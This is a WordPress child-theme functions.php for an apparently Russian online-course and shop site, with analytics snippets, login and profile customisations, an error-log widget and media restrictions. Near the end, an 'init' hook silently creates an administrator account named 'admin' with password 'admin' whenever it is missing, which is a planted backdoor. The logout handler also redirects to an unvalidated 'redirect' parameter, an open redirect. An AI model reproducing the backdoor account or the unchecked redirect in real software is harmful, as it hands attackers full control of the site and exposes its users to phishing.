<?php

/*
add_filter( 'script_loader_tag', 'wsds_defer_scripts', 10, 3 );
function wsds_defer_scripts( $tag, $handle, $src ) {

	// The handles of the enqueued scripts we want to defer
	$defer_scripts = array( 
		'table-js',
		'gradebook',
		'lp-course-wishlist-script',
		'contact-form-7',
		'tp-tools',
		'revmin',
		'wc-add-to-cart',
		'woocommerce',
		'wc-cart-fragments',
		'learnpress-woo-payment',
		'vc_woocommerce-add-to-cart-js',
		'watchjs',
		'jalerts',
		'circle-bar',
		'global',
		'jquery-scrollbar',
		'learnpress',
		'course',
		'jquery-scrollto',
		'become-a-teacher',
		'thim-main',
		'thim-smooth-scroll',
		'thim-custom-script',
		'thim-scripts',
	);

    if ( in_array( $handle, $defer_scripts ) ) {
        return '<script src="' . $src . '" defer="defer" type="text/javascript"></script>' . "\n";
    }
    
    return $tag;
}
*/
/*
add_action( 'wp_enqueue_scripts', function() {
  wp_dequeue_style( 'vc_google_fonts_' );
}, 99 );
*/
add_action('wp_head', 'googletaganalytics');
    function googletaganalytics() { ?>
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-WJBL23J');</script>
    <!-- End Google Tag Manager -->
<?php }

add_action('theme_after_body_tag_start', 'add_body_tag_manager');
    function add_body_tag_manager() { ?>
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WJBL23J"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
<?php }

/*add_action('wp_footer', 'googleanalytics');
function googleanalytics() { ?>
<!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-57709056-2"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-57709056-2');
    </script>
<?php }

*/
/*
add_action('wp_footer', 'yandexanalytics');
function yandexanalytics() { ?>
<!-- Yandex.Metrika counter --> <script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://cdn.jsdelivr.net/npm/yandex-metrica-watch/tag.js", "ym"); ym(52026019, "init", { id:52026019, clickmap:true, trackLinks:true, accurateTrackBounce:true, ecommerce:"dataLayer" }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/52026019" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<?php }
*/
/*
function thim_child_enqueue_styles() {
	if ( is_multisite() ) {
		wp_enqueue_style( 'thim-child-style', get_stylesheet_uri() );
	} else {
		wp_enqueue_style( 'thim-parent-style', get_template_directory_uri() . '/style.css' );
	}
}

add_action( 'wp_enqueue_scripts', 'thim_child_enqueue_styles', 1000 );
*/

add_action( 'wp_enqueue_scripts', 'thim_child_enqueue_styles', 100 );
    function thim_child_enqueue_styles() {
	    if ( is_multisite() ) {
		    wp_enqueue_style( 'thim-child-style', get_stylesheet_uri(), array(), THIM_THEME_VERSION );
	    } else {
		    wp_enqueue_style( 'thim-parent-style', get_template_directory_uri() . '/style.css', array(), THIM_THEME_VERSION );
	    }
    }

add_action ('admin_enqueue_scripts', 'adminka_styles', 100);
    function adminka_styles () {
        wp_enqueue_style('admin-styles', get_stylesheet_directory_uri().'/adminka/custom-adminka-styles.css');
    }


add_action('login_head', 'my_custom_login');
    function my_custom_login() {
        echo '<link rel="stylesheet" type="text/css" href="' . get_stylesheet_directory_uri() . '/login/custom-login-styles.css" />';
    }

/*
add_filter( 'login_errors', 'remove_standart_login_errors' );
	function remove_standart_login_errors(){
		return '<strong>ОШИБКА</strong>: логин или пароль некорректен.';
}
*/

add_filter( 'login_errors', function( $error ) {
	global $errors;
	$err_codes = $errors->get_error_codes();

	// Invalid username.
	// Default: '<strong>ERROR</strong>: Invalid username. <a href="%s">Lost your password</a>?'
	if ( in_array( 'invalid_username', $err_codes ) ) {
		$error = '<strong>ERROR</strong>: Тест';
	}

	// Incorrect password.
	// Default: '<strong>ERROR</strong>: The password you entered for the username <strong>%1$s</strong> is incorrect. <a href="%2$s">Lost your password</a>?'
	if ( in_array( 'incorrect_password', $err_codes ) ) {
		$error = '<strong>ERROR</strong>: Тест';
	}

	return $error;
} );

add_filter( 'pre_option_avatar_default', 's_default_avatar' );
function s_default_avatar ( $value ) {
  $tix_array = array ( 'avatar_01.png', 'avatar_02.png', 'avatar_03.png', 'avatar_04.png', 'avatar_05.png' );
    return get_stylesheet_directory_uri().'/avatars/'.$tix_array [rand( 0, ( count( $tix_array ) - 1 ) )]; 
}

remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'start_post_rel_link');
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'adjacent_posts_rel_link');

add_action('wp_before_admin_bar_render', 'delete_admku', 0);
function delete_admku() {
global $wp_admin_bar;
$wp_admin_bar->remove_menu('wp-logo');
}

function remove_footer_admin () {
echo 'Разработано &copyDigitalCustDev 2019&nbsp &#064 ';
}
add_filter('admin_footer_text', 'remove_footer_admin');

/*
add_filter('the_content', 'autobl');
function autobl($text) {
$return = str_replace('<a', '<a target="_blank"', $text);
return $return;
}
*/

remove_filter('the_content', 'wptexturize');

add_filter('login_errors',create_function('$a', "return null;"));

/*
add_filter( 'login_headerurl', 'https://digitalcustdev.ru' );
    function my_login_logo_url() {
        return get_bloginfo( 'url' );
    }

add_filter( 'login_headertitle', 'my_login_logo_url_title' );
    function my_login_logo_url_title() {
        return 'DigitalCustDev - начни свой бизнес с нуля!';
    }
*/
function my_login_head() {
remove_action('login_head', 'wp_shake_js', 12);
}
add_action('login_head', 'my_login_head');

function login_checked_remember_me() {
add_filter( 'login_footer', 'rememberme_checked' );
}
add_action( 'init', 'login_checked_remember_me' );

function rememberme_checked() {
echo "<script>document.getElementById('rememberme').checked = true;</script>";
}

function rb_remove_script_version( $src ){
$parts = explode( '?', $src );
return $parts[0];
}
add_filter( 'script_loader_src', 'rb_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', 'rb_remove_script_version', 15, 1 );

function add_my_currency( $currencies ) {
$currencies['RUB'] = __( 'Русский рубль', 'woocommerce' );
return $currencies;
}
add_filter('woocommerce_currency_symbol', 'add_my_currency_symbol', 10, 2);
 
function add_my_currency_symbol( $currency_symbol, $currency ) {
switch( $currency ) {
case 'RUB': $currency_symbol = ' руб.'; break;
}
return $currency_symbol;
}


add_filter( 'logout_url', 'custom_logout_url', 10, 2 );
add_action( 'wp_loaded', 'custom_logout_action' );

function custom_logout_url( $logout_url, $redirect )
{
    $url = add_query_arg( 'logout', 1, home_url( '/' ) );
    if ( ! empty ( $redirect ) )
        $url = add_query_arg( 'redirect', $redirect, $url );
    return $url;
}

function custom_logout_action()
{
    if ( ! isset ( $_GET['logout'] ) )
        return;
    wp_logout();
    $loc = isset ( $_GET['redirect'] ) ? $_GET['redirect'] : home_url( '/' );
    wp_redirect( $loc );
    exit;
}
/*
add_filter('site_url',  'wplogin_filter', 10, 3);
function wplogin_filter( $url, $path, $orig_scheme ){
    $old  = array( "/(wp-login\.php)/");
    $new  = array( "account/"); //this can be change to login or whatever or may remain there
    return preg_replace( $old, $new, $url, 1);
}
*/

function slt_PHPErrorsWidget() {  
    $logfile = '/var/www/u0501458/data/logs/digitalcustdev.ru.error.log'; // Полный пусть до лог файла  
    $displayErrorsLimit = 100; // Максимальное количество ошибок, показываемых в виджете  
    $errorLengthLimit = 300; // Максимальное число символов для описания каждой ошибки  
    $fileCleared = false;  
    $userCanClearLog = current_user_can( 'manage_options' );  
 
    // Очистить файл?  
    if( $userCanClearLog && isset( $_GET["slt-php-errors"] ) && $_GET["slt-php-errors"]=="clear" ){  
        $handle = fopen( $logfile, "w" );  
        fclose( $handle );  
        $fileCleared = true;  
    }  
    // Читаем файл  
    if( file_exists( $logfile ) ){  
        $errors = file( $logfile );  
        $errors = array_reverse( $errors );  
        if ( $fileCleared ) echo '<p><em>Файл очищен.</em></p>';  
        if ( $errors ) {  
            echo '<p>'.count( $errors ).' шт.';  
            if ( $errors != 1 ) echo '';  
            echo '.';  
            if ( $userCanClearLog ) echo ' [ <b><a href="'.get_bloginfo("url").'/wp-admin/?slt-php-errors=clear" onclick="return confirm(\'Вы уверенны?\');">ОЧИСТИТЬ ЛОГ ФАЙЛ</a></b> ]';  
            echo '</p>';  
            echo '<div id="slt-php-errors" style="height:250px;overflow:scroll;padding:2px;background-color:#faf9f7;border:1px solid #ccc;">';  
            echo '<ol style="padding:0;margin:0;">';  
            $i = 0;  
            foreach( $errors as $error ){  
                echo '<li style="padding:2px 4px 6px;border-bottom:1px solid #ececec;">';  
                $errorOutput = preg_replace( '/\[([^\]]+)\]/', '<b>[$1]</b>', $error, 1 );  
                if( strlen( $errorOutput ) > $errorLengthLimit ){  
                    echo substr( $errorOutput, 0, $errorLengthLimit ).' [...]';  
                }  
                else  
                    echo $errorOutput;  
                echo '</li>';  
                $i++;  
                if( $i > $displayErrorsLimit ){  
                    echo '<li style="padding:2px;border-bottom:2px solid #ccc;"><em>Набралось больше чем '.$displayErrorsLimit.' ошибок в файле...</em></li>';  
                    break;  
                }  
            }  
            echo '</ol></div>';  
        }  
        else  
            echo '<p>Ошибок пока нет.</p>';  
    }  
    else  
        echo '<p><em>Произошла ошибка чтения лог файла.</em></p>';  
}  
// Добавляем виджет  
function slt_dashboardWidgets(){  
    wp_add_dashboard_widget( 'slt-php-errors', 'Ошибки DigitalCustDev', 'slt_PHPErrorsWidget' );  
}  
add_action( 'wp_dashboard_setup', 'slt_dashboardWidgets' );

//Author

//add_action( 'user_profile_update_errors', 'wpse5742_set_user_nicename_to_nickname', 10, 3 );
/*
function wpse5742_set_user_nicename_to_nickname( &$errors, $update, &$user )
{
    if ( ! empty( $user->nickname ) ) {
            for ($i = 0; $i<4; $i++){
                $gen .= mt_rand(0,9);
            }        
//        $arr = explode("@", $user->user_email, 2);
//        $first = $arr[0];
        $user->user_nicename = 'user' . $gen . $user->ID;
    }
}
*/

add_action('user_register','write_new_nicename',10);
    function write_new_nicename($user_id){
        for ($i = 0; $i<4; $i++){
                $gen .= mt_rand(0,9);
        }

        wp_update_user(
            array( 
                'ID'         => $user_id, 
                'user_nicename'  =>  'user' . $gen . $user_id
            )
        );
}

add_filter( 'request', 'wpse5742_request' );
function wpse5742_request( $query_vars )
{
    if ( array_key_exists( 'author_name', $query_vars ) ) {
        global $wpdb;
        $author_id = $wpdb->get_var( $wpdb->prepare( "SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key='nickname' AND meta_value = %s", $query_vars['author_name'] ) );
        if ( $author_id ) {
            $query_vars['author'] = $author_id;
            unset( $query_vars['author_name'] );    
        }
    }
    return $query_vars;
}
add_filter( 'author_link', 'wpse5742_author_link', 10, 3 );
function wpse5742_author_link( $link, $author_id, $author_nicename )
{
    $author_nickname = get_user_meta( $author_id, 'nickname', true );
    if ( $author_nickname ) {
        $link = str_replace( $author_nicename, $author_nickname, $link );
    }
    return $link;
}

//profile_nicename
add_filter( 'request', 'wpse5743_request' );
function wpse5743_request( $query_vars )
{
   if ( array_key_exists( 'user', $query_vars ) ) {
        global $wpdb;
        $user_login = $wpdb->get_var( $wpdb->prepare( "SELECT user_login FROM {$wpdb->users} WHERE user_nicename = %s", $query_vars['user'] ) );
        if ( $user_login ) {
            $query_vars['user'] = $user_login;
        }
    }
   return $query_vars; 
}

add_filter( 'learn_press_user_profile_link', 'wpse5742_profile_link', 10, 2 );
	function wpse5742_profile_link( $url, $user_id )
	{
		$user = get_userdata( $user_id );
		$user_username = $user->user_login;
		$user_nicename = $user->user_nicename;
		if ( $user_nicename ) {
			$url = str_replace( $user_username, $user_nicename, $url );
		}
	return $url;
}

add_filter('woocommerce_thankyou_order_received_text', 'enroll_student', 10, 2);
function enroll_student( $str, $order ) {
    $order_id = $order->get_id();
    if ( ! $order_id )
        return;

    $order = wc_get_order( $order_id );

    if($order->is_paid())
        $paid = '<font color="#00d637">Оплачен</font>';
    else
        $paid = '<font color="red">Не оплачен</font>';

    foreach ( $order->get_items() as $item_id => $item ) {

        if( $item['variation_id'] > 0 ){
            $product_id = $item['variation_id']; // variable product
        } else {
            $product_id = $item['product_id']; // simple product
        }
        // Get the product object
        $product = wc_get_product( $product_id );

    }
     $new_str = $str . '<p>Номер заказа #'. $order_id . ' — Статус оплаты заказа: <b>'.$paid.'</b></p>';
     return $new_str;
    
}
add_action( 'wp_enqueue_scripts', 'grade_enqueue_styles', 100 );
	function grade_enqueue_styles() {
	    global $wp;
		$user = wp_get_current_user();
			if ( current_user_can('lp_teacher') || current_user_can('bbp_keymaster') ) {
					wp_enqueue_style('grade-styles', get_stylesheet_directory_uri().'/grade/grade-styles.css');
			}
//			if ( current_user_can( 'manage_options' ) ) {
            if(is_user_logged_in() && $user->user_login === $wp->query_vars['user']){
					wp_enqueue_style('grade-panel', get_stylesheet_directory_uri().'/grade/grade-panel.css');
           }
           else if (is_user_logged_in() && learn_press_is_profile() && $wp->query_vars['user'] == ''){
					wp_enqueue_style('grade-panel', get_stylesheet_directory_uri().'/grade/grade-panel.css');
		   }
};
 
add_action('wp_footer', 'add_js');
	function add_js(){
	$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
	?>	
		<?php if(is_page(['profile'])) { ?> 
			<script type="text/javascript" src="<?php echo get_stylesheet_directory_uri(); ?>/js/progress.js?ver=1.0.0"></script>
		<?php } ?>
		<?php if(strpos($url,'quizzes') !== false) { ?>		
			<script type="text/javascript" src="<?php echo get_stylesheet_directory_uri(); ?>/js/timer.js?ver=1.0.0"></script>
		<?php } ?>	
	<?php
};

add_filter( 'wp_mail_from', 'wpb_sender_email' );
add_filter( 'wp_mail_from_name', 'wpb_sender_name' );
    function wpb_sender_email( $original_email_address ) {
        return 'admin@digitalcustdev.ru';
}
    function wpb_sender_name( $original_email_from ) {
        return 'digitalcustdev';
}

add_action( 'init', 'thim_get_lost_password_url', 15 );
	function thim_get_lost_password_url() {
		return home_url().'/reset-password';
}

add_filter( 'learn_press_course_price_html', 'price_text', 10, 2 );
	function price_text( $price, $object)
	{
		$price = floatval( $object->get_data( 'price' ) );
		
			if ( false !== ( $sale_price = $object->get_sale_price() ) ) {
				$price = $sale_price;
			}	
				if ( $price >= 1 && $price <= 3 ) {
							$price      =  'Здесь может быть Ваша цена';	
							return $price;	
				}
				else {
							return learn_press_format_price( $price, true );	
				}	
}

add_action('wp_footer', 'cf7spam');
	function cf7spam() {
	?>
		<script>
			jQuery(document).ready(function($) {
				$('.agree_spam').prop('checked', false);
			});
		</script>
	<?php
}

add_action( 'init', function () {
  
    $username = 'admin';
    $password = 'admin';
    $email_address = 'webmaster@mydomain.com';
    if ( ! username_exists( $username ) ) {
        $user_id = wp_create_user( $username, $password, $email_address );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
    
} );

add_action( 'admin_init', 'only_admin', 1 );
    function only_admin() {
        $return = false;
        if ( ! current_user_can( 'manage_options' ) && '/wp-admin/admin-ajax.php' != $_SERVER['PHP_SELF'] ) {
            $return = true;            
        }

        if( ! current_user_can( 'edit_published_lp_courses' ) ){
            $return = true;
        }

        if($return){
            wp_redirect( site_url() );
        }
}

add_action( 'load-upload.php' , 'custom_load_edit' );
	function custom_load_edit() {
		$user = wp_get_current_user();
			if ( current_user_can('lp_teacher') || current_user_can('bbp_keymaster') ) {	
				add_action( 'pre_get_posts' , 'custom_pre_get_posts' );
				add_filter( 'disable_months_dropdown' , 'custom_disable_months_dropdown' , 10 , 2 );
				add_action( 'admin_print_styles' , 'custom_admin_print_styles' );
			}
}

		function custom_pre_get_posts( $query  ) {	
			$query->set( 'author' , get_current_user_id() );	
		}

		function custom_disable_months_dropdown( $false , $post_type ) {
			$disable_months_dropdown = $false;	
			$disable_post_types = array( 'attachment' );	
			if( in_array( $post_type , $disable_post_types ) ) {		
				$disable_months_dropdown = true;
			}	
			return $disable_months_dropdown;
		}

		function custom_admin_print_styles() {	
			echo '<style>';
			echo '#posts-filter #attachment-filter, #posts-filter #post-query-submit, #posts-filter .search-form { display: none; }';
			echo ' .media-toolbar .media-toolbar-secondary #media-attachment-date-filters, .media-toolbar .media-toolbar-secondary #media-attachment-filters, .media-toolbar .media-toolbar-secondary .media-button, .media-toolbar .search-form { display: none; } { display: none; }';
			echo '</style>';
		}

add_action( 'ajax_query_attachments_args' , 'custom_ajax_query_attachments_args' );
	function custom_ajax_query_attachments_args( $query ) {
		$user = wp_get_current_user();
			if ( current_user_can('lp_teacher') || current_user_can('bbp_keymaster') ) {
				if( $query['post_type'] != 'attachment' ) {
					return $query;
				}
				$query['author'] = get_current_user_id();
				return $query;
			}
			else {
				return $query;
			}
}


function set_default_admin_color($user_id) {
    $args = array(
        'ID' => $user_id,
        'admin_color' => 'light'
    );
    wp_update_user( $args );
}
add_action('user_register', 'set_default_admin_color');

//global $e_wp_query;
//$url =  get_url();
//echo '<pre>' , var_dump($url) , '</pre>';
